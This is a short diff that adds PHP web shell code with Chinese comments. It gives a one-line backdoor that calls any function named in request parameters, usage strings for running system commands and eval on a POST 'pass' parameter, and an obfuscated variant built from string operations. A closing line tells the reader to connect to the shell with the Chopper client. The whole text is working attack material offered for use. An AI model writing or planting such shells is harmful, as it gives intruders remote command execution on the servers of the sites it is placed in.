@@ -1,0 +1,17 @@
+<?php
+$_REQUEST['a']($_REQUEST['b']);
+?>
+
+?a=system&b=dir       //执行系统命令
+?a=assert&b=phpinfo();        //执行php代码
+?a=assert&b=eval($_POST['pass'])      //一句话
+
+
+<?php
+$_="";
+$_[+""]='';
+$_="$_"."";
+$_=($_[+""]|"").($_[+""]|"").($_[+""]^"");
+?>
+<?php ${'_'.$_}['_'](${'_'.$_}['__']);?>
+在菜刀里写http://site/2.php?_=assert&__=eval($_POST['pass']) 密码是pass。 
